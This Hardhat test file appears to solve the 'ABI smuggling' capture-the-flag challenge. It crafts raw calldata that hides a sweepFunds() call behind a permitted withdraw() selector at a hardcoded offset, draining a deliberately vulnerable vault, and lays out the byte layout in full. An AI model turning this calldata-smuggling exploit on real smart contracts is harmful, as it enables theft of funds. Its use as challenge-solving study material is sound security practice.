const { ethers } = require("hardhat");
const { expect } = require("chai");
describe("[Challenge] ABI smuggling", function () {
  let deployer, player, recovery;
  let token, vault;

  const VAULT_TOKEN_BALANCE = 1000000n * 10n ** 18n;

  before(async function () {
    /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
    [deployer, player, recovery] = await ethers.getSigners();

    // Deploy Damn Valuable Token contract
    token = await (
      await ethers.getContractFactory("DamnValuableToken", deployer)
    ).deploy();

    // Deploy Vault
    vault = await (
      await ethers.getContractFactory("SelfAuthorizedVault", deployer)
    ).deploy();
    expect(await vault.getLastWithdrawalTimestamp()).to.not.eq(0);

    // Set permissions
    const deployerPermission = await vault.getActionId(
      "0x85fb709d",
      deployer.address,
      vault.address
    );
    const playerPermission = await vault.getActionId(
      "0xd9caed12",
      player.address,
      vault.address
    );
    await vault.setPermissions([deployerPermission, playerPermission]);
    expect(await vault.permissions(deployerPermission)).to.be.true;
    expect(await vault.permissions(playerPermission)).to.be.true;

    // Make sure Vault is initialized
    expect(await vault.initialized()).to.be.true;

    // Deposit tokens into the vault
    await token.transfer(vault.address, VAULT_TOKEN_BALANCE);

    expect(await token.balanceOf(vault.address)).to.eq(VAULT_TOKEN_BALANCE);
    expect(await token.balanceOf(player.address)).to.eq(0);

    // Cannot call Vault directly
    await expect(
      vault.sweepFunds(deployer.address, token.address)
    ).to.be.revertedWithCustomError(vault, "CallerNotAllowed");
    await expect(
      vault.connect(player).withdraw(token.address, player.address, 10n ** 18n)
    ).to.be.revertedWithCustomError(vault, "CallerNotAllowed");
  });

  /**
   * The goal of this challenge is to call the sweepFunds function of the Vault contract, transferring all tokens to the recovery address.
   * This challenge involves identifying these two things:
   * - Selector offset is hardcoded to 4 + 32 * 3 in execute() function.
   * - The lack of proper actionData check in the Vault contract.
   * This allows us to "smuggle" in additional function calls to the Vault contract by manipulating the actionData payload,
   * such that the selector checks can be bypassed.
   *
   * This requires us to carefully craft the actionData payload and send the tx to the Vault contract.
   * Essentially, we must keep these in mind as we are encoding the parameters:
   * - The first 4 bytes of the actionData must be the execute() selector.
   * - The next 32 bytes must be the address of the Vault contract.
   * - The next 32 bytes must be the offset (we choose 0x80 a.k.a 128 bytes offset as it is the closest).
   * - The next 32 bytes must be a placeholder which would have been originally the length of the actionData.
   * - The next 4 bytes must be the withdraw() selector.
   * - The next 28 bytes must be padding.
   * - The next 32 bytes must be the length of the actionData.
   * - The next 4 bytes must be the sweepFunds() selector.
   * - The next 32 bytes must be the address of the recovery account.
   * - The next 32 bytes must be the address of the token.
   * The 0x80 offset allows us to skip to our malicious sweepFunds function call, bypassing the checks.
   */
  it("Execution", async function () {
    /** CODE YOUR SOLUTION HERE */
    const actionData =
      ethers.utils.id("execute(address,bytes)").substring(0, 10) +
      ethers.utils.hexZeroPad(vault.address, 32).substring(2) +
      ethers.utils.hexZeroPad("0x80", 32).substring(2) +
      ethers.utils.hexZeroPad("0x00", 32).substring(2) +
      ethers.utils.id("withdraw(address,address,uint256)").substring(2, 10) +
      ethers.utils.hexZeroPad("0x00", 28).slice(2) +
      ethers.utils.hexZeroPad("0x44", 32).substring(2) +
      vault.interface
        .encodeFunctionData("sweepFunds", [recovery.address, token.address])
        .slice(2);

    // Memory stack looks something like this with bytes in brackets:
    /**
        0x1cff79cd // execute | Memory [0-4]
        000000000000000000000000e7f1725E7734CE288F8367e1Bb143E90bb3F0512 // vault address | [4-36]
        0000000000000000000000000000000000000000000000000000000000000080 // offset | [36-68]
        0000000000000000000000000000000000000000000000000000000000000000 // originally where length of actionData is stored | [68-100]
        d9caed12 // withdraw | [100-104]
        00000000000000000000000000000000000000000000000000000000 // padding | [104-132]
        0000000000000000000000000000000000000000000000000000000000000044 // length of actionData | [132-164]
        85fb709d // sweep funds [164-168]
        0000000000000000000000003c44cdddb6a900fa2b585dd299e03d12fa4293bc // recovery address | [168-200]
        0000000000000000000000005fbdb2315678afecb367f032d93f642f64180aa3 // token address | [200-232]
    */
    console.log("actionData: ", actionData);

    await player.sendTransaction({
      to: vault.address,
      data: actionData,
    });
  });

  after(async function () {
    /** SUCCESS CONDITIONS - NO NEED TO CHANGE ANYTHING HERE */
    expect(await token.balanceOf(vault.address)).to.eq(0);
    expect(await token.balanceOf(player.address)).to.eq(0);
    expect(await token.balanceOf(recovery.address)).to.eq(VAULT_TOKEN_BALANCE);
  });
});
